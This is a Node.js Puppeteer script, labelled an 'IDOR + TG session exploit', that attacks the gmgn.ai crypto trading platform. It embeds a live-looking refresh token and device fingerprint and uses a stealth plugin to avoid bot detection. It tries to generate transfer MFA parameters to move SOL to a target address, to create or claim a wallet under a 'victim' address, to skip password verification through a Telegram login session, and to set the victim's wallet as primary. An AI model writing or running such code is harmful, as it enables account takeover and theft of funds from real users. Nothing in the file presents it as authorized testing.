const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

const ORIG_REFRESH = 'eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL3JlZnJlc2giLCJkYXRhIjp7InVzZXJfaWQiOiIwMGRhZTg3MC04NDkwLTRkMTktYmZjMC0zOWNlNDllOTA2YjUiLCJjbGllbnRfaWQiOiJnbWduX3dlYl8yMDI2MDcxNS0yMTYxLTE4ZDViMTAiLCJkZXZpY2VfaWQiOiJkZTYyMGE1Ny1kOThlLTQyOTMtYjAwNy01ZDMxNTQ1NWUyMWQiLCJmYXRoZXJfaWQiOiIiLCJmaW5nZXJwcmludCI6InYxNTMyNDdiOWUwZTE4NGZiZWQzZmFjNzNmMTlkY2E2OGEiLCJhcHAiOiJnbWduIiwicGxhdGZvcm0iOiJ3ZWIifSwiZXhwIjoxNzg2NzQ5NDg4LCJpYXQiOjE3ODQxNTc0ODgsImlzcyI6ImdtZ24uYWkvc2lnbmVyIiwianRpIjoiOTgxMWFhNjUtODg1Mi00MTVjLWFmNTAtNTk2ZjcxMmM1MmJhIiwibmJmIjoxNzg0MTU3NDg4LCJzdWIiOiJnbWduLmFpL3JlZnJlc2giLCJ1c2VyX2lkIjoiMDBkYWU4NzAtODQ5MC00ZDE5LWJmYzAtMzljZTQ5ZTkwNmI1IiwidmVyIjoiMS4wIn0.KNxifpPUukpBroGap6hYIWrPKPwLiiv8xRCZx5zpRCI7FJdXSdhVSnjxSnuqkETXZyCvKMV2qxPBSpovwWaDCQ';
const TARGET = '5KCVo4xnj8n38FUyF2gFUzgJbDW9vV4C1bTpciznyciU';
const PARAMS = 'device_id=de620a57-d98e-4293-b007-5d315455e21d&fp_did=4e8cc7f90484bd356291ff79db6b9b09&client_id=gmgn_web_20260715-2161-18d5b10&from_app=gmgn&app_ver=20260715-2161-18d5b10&tz_name=Asia%2FAden&tz_offset=10800&app_lang=en-US&os=web&worker=0';

(async () => {
    console.log('🔥 WALLET CREATE IDOR + TG SESSION EXPLOIT');
    
    const browser = await puppeteer.launch({headless: 'new', args: ['--no-sandbox']});
    const page = await browser.newPage();
    await page.goto('https://gmgn.ai', {waitUntil: 'networkidle2', timeout: 25000});
    await new Promise(r => setTimeout(r, 4000));
    
    const result = await page.evaluate(async (refresh, params, target) => {
        const log = [];
        
        // Get token
        let r = await fetch('/account/account/refresh_access_token', {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({refresh_token: refresh})
        });
        let data = await r.json();
        if (data.code !== 0) return {error: 'token fail'};
        const token = data.data.data.token;
        const h = {'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token};
        log.push('✅ Token OK');
        
        // ====== TEST: Can we generate transfer MFA for the NEW wallet we just created? ======
        // We created 9qVGfoQAQZwkAqeeYWGdBLdeB4X8MtEvLW55uYBovTyz
        // Can we NOW transfer from it? (proving wallet ownership)
        log.push('=== TEST: Transfer MFA for new wallet ===');
        
        const newWallet = '9qVGfoQAQZwkAqeeYWGdBLdeB4X8MtEvLW55uYBovTyz';
        r = await fetch('/wallet-api/v1/generate_mfa_params?' + params, {
            method: 'POST', headers: h,
            body: JSON.stringify({
                usage: 'transfer',
                biz_params: {
                    transfer_id: '999', transfer_type: '999',
                    chain: 'sol', from_address: newWallet,
                    to_address: target, amount: '1', amount_txt: '0.000000001',
                    token_address: 'So11111111111111111111111111111111111111112', symbol: 'SOL'
                }
            })
        });
        data = await r.json();
        log.push('Transfer MFA for new wallet: ' + data.code + ' ' + (data.message||''));
        if (data.code === 0) {
            log.push('verify_items: ' + JSON.stringify(data.data?.verify_items));
            if (!data.data?.verify_items?.length) {
                log.push('💀 NO MFA ON NEW WALLET TRANSFER!');
            }
        }
        
        // ====== MAIN ATTACK: Can we create wallet WITH victim address? ======
        log.push('=== WALLET CREATE WITH VICTIM ADDRESS ===');
        
        const createPayloads = [
            {chain: 'sol', address: target},
            {chain: 'sol', wallet_address: target},
            {chain: 'sol', import_address: target},
            {chain: 'sol', external_address: target},
        ];
        
        for (const body of createPayloads) {
            r = await fetch('/tapi/v1/wallet/create?' + params, {
                method: 'POST', headers: h, body: JSON.stringify(body)
            });
            data = await r.json();
            if (data.code === 0 && data.data?.address === target) {
                log.push('💀💀💀 CREATED WALLET WITH VICTIM ADDRESS: ' + JSON.stringify(body));
                log.push('Response: ' + JSON.stringify(data));
                return {log, success: true, approach: 'create_with_address', data};
            }
            if (data.code === 0) {
                log.push('Created new wallet (not victim): ' + data.data?.address);
            } else {
                log.push('create(' + JSON.stringify(body).substring(0,40) + '): ' + data.code + ' ' + (data.message||'').substring(0,50));
            }
        }
        
        // ====== TG SESSION: Can we get a token from TG login without captcha? ======
        log.push('=== TG SESSION → TOKEN ===');
        
        r = await fetch('/account/login_v3?device_id=tg123&client_id=gmgn_tg_bot&from_app=tg', {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({account: 'foxtest@proton.me', account_type: 'email'})
        });
        data = await r.json();
        log.push('TG session: ' + JSON.stringify(data).substring(0, 300));
        
        if (data.code === 0 && data.data?.session_id) {
            const sessionId = data.data.session_id || data.data.data?.session_id;
            log.push('Got session: ' + sessionId);
            
            // Can we use this session to complete SRP and get a token?
            // The SRP flow is: session_id + password_hash → token
            // But we don't have the password...
            // UNLESS: Can we skip SRP and just get a token from the session?
            
            const sessionTests = [
                {url: '/account/login_v3?device_id=tg123&client_id=gmgn_tg_bot&from_app=tg', body: {session_id: sessionId, step: 2}},
                {url: '/account/login_v3?device_id=tg123&client_id=gmgn_tg_bot&from_app=tg', body: {session_id: sessionId, account: 'foxtest@proton.me', password: ''}},
            ];
            
            for (const t of sessionTests) {
                r = await fetch(t.url, {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(t.body)});
                data = await r.json();
                log.push('session test: ' + data.code + ' ' + (data.message||'').substring(0, 60));
                if (data.code === 0 && JSON.stringify(data).includes('token')) {
                    log.push('💀 GOT TOKEN FROM TG SESSION!');
                    return {log, success: true, approach: 'tg_token', data};
                }
            }
        }
        
        // ====== FINAL: Use set_primary to make victim wallet primary ======
        log.push('=== SET PRIMARY ===');
        r = await fetch('/tapi/v1/wallet/set_primary?' + params, {
            method: 'POST', headers: h,
            body: JSON.stringify({chain: 'sol', wallet_address: target})
        });
        data = await r.json();
        log.push('set_primary victim: ' + data.code + ' ' + (data.message||data.reason||'').substring(0,50));
        if (data.code === 0) return {log, success: true, approach: 'set_primary'};
        
        return {log};
    }, ORIG_REFRESH, PARAMS, TARGET);
    
    console.log(JSON.stringify(result, null, 2));
    await browser.close();
})();
